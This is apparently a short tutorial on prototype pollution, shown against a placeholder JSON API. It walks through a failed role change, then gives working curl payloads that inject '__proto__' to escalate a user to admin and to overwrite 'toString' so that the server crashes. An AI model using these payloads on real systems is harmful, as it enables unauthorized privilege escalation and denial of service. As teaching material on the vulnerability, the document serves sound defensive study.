## $\textnormal{Vulnerable API}$

> - Change the about section.

```sh
# Send the POST request.
curl -H "Content-Type: application/json" -X POST -d '{"about": "Database sanitization expert"}' https://api.startup.io/users/1337

# POST response.
{ name: "Robert", surname: "Tables", about: "Database sanitization expert" }
```

<br />

> - Check how the HTTP GET endpoint works.

```sh
# Send the GET request.
curl -X GET https://api.startup.io/users/1337/role

# GET response.
{ role: "user" }
```

<br />
<br />



## $\textnormal{Hacking 1: Naive, Failed Attempt}$

> - Check if we can modify our role and set to `admin`.

```sh
# Send the POST request.
curl -H "Content-Type: application/json" -X POST -d '{"role": "admin"}' https://api.startup.io/users/1337
curl -X GET https://api.startup.io/users/1337/role

# Failed POST response.
{ role: "user" }
```

<br />
<br />



## $\textnormal{Hacking 2: Privilege Escalation with Prototype Pollution}$

> - Send the POST request again using `__proto__` prefix.

```sh
# Send the POST request.
curl -H "Content-Type: application/json" -X POST -d '{"about": {"__proto__": {"role": "admin"}}}' https://api.startup.io/users/1337
curl -X GET https://api.startup.io/users/1337/role

# GET response.
{ role: "admin" }
```

<br />
<br />



## $\textnormal{Hacking 3: Bringing Down the API }$

> - Bringing down a likely function (`toString`) called by <br />
    any program in `JavaScript`.

```sh
# Send the POST request to bring down the toString function.
curl -H "Content-Type: application/json" -X POST -d '{"about": {"__proto__": {"toString": "Two bytes meet. The first byte asks: Are you ill? The second byte replies: No, just feeling a bit off."}}}' https://api.startup.io/users/1337

# POST Response.
500 Internal Server Error
```

> - Whenever the JavaScript runtime invokes toString() it <br />
    expects it to be a method.

> - But, it is no longer a method after our change (it is <br />
    a dad joke now, i.e. a string literal), so the whole <br />
    web server crashes, resulting in 500 errors.
